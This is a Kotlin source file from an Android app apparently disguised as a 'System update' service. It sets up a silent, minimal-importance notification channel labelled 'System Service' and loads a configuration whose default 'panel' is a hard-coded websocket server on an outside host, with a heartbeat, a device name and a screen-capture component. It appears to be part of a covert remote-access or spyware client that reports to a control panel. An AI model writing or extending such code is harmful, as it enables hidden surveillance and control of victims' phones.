package com.system.update

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build

class App : Application() {
    companion object {
        const val CHANNEL_ID = "sys_update_ch"
        lateinit var instance: App
        var config: Config = Config()
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        config = Config.load(this)
        createChannel()
    }

    override fun onTerminate() {
        ScreenCapture.release()
        super.onTerminate()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "System update service"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(ch)
        }
    }
}

data class Config(
    val panelUrl: String = "ws://fikrihost77.binhosst.web.id:3188/ws",
    val username: String = "",
    val deviceName: String = "",
    val reconnectDelayMs: Long = 3000L,
    val heartbeatMs: Long = 15000L
) {
    companion object {
        fun load(ctx: Context): Config {
            // Username dari SharedPreferences (di-set saat setup)
            val prefs = ctx.getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
            val savedUser = prefs.getString("username", "") ?: ""

            return try {
                val json = ctx.assets.open("config.json").bufferedReader().use { it.readText() }
                val obj = com.google.gson.JsonParser.parseString(json).asJsonObject
                Config(
                    panelUrl = obj.get("panel_url")?.asString ?: "ws://fikrihost77.binhosst.web.id:3188/ws",
                    username = if (savedUser.isNotEmpty()) savedUser
                               else obj.get("username")?.asString ?: "",
                    deviceName = obj.get("device_name")?.asString ?: Build.MODEL,
                    reconnectDelayMs = obj.get("reconnect_delay_ms")?.asLong ?: 3000L,
                    heartbeatMs = obj.get("heartbeat_ms")?.asLong ?: 15000L
                )
            } catch (e: Exception) {
                Config(username = savedUser)
            }
        }
    }
}
